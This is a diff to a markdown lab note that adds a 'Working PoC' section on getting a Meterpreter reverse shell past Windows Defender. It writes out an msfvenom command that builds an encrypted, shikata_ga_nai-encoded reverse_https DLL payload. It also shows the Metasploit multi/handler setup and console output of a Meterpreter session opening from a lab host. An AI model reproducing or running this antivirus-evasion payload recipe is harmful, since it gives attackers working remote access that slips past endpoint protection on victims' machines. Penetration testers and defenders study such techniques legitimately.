@@ -109,3 +109,30 @@ I investigated the methods described below for meterpreter and Defender caught b
 [Windows Defender Bypassing For Meterpreter](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
 
 [Evading Antivirus with Better Meterpreter Payloads](https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/)
+
+### Working PoC
+Using the DLL Loading technique discribed above and using stage encoding, meterpreter was able to be delievered with Defender.
+#### DLL Generation
+Same loader.cpp / loader.exe is used.
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.220.129 LPORT=443 EnableStageEncoding=true --encrypt aes256-cbc --encrypt-key jackery --encoder x86/shikata_ga_nai -f dll -o shellcode.dll
+```
+
+#### MSF Setup
+```
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
+msf5 exploit(multi/handler) > set EnableStageEncoding true
+msf5 exploit(multi/handler) > set LHOST 0.0.0.0 
+msf5 exploit(multi/handler) > set LPORT 443
+msf5 exploit(multi/handler) > run
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:443
+[*] https://0.0.0.0:443 handling request from 192.168.220.142; (UUID: 2jgz5xmb) Encoded stage with x86/shikata_ga_nai
+[*] https://0.0.0.0:443 handling request from 192.168.220.142; (UUID: 2jgz5xmb) Staging x86 payload (177270 bytes) ...
+[*] Meterpreter session 5 opened (192.168.220.129:443 -> 192.168.220.142:50091) at 2020-10-31 11:47:22 -0400
+
+meterpreter >  
+```
+
+
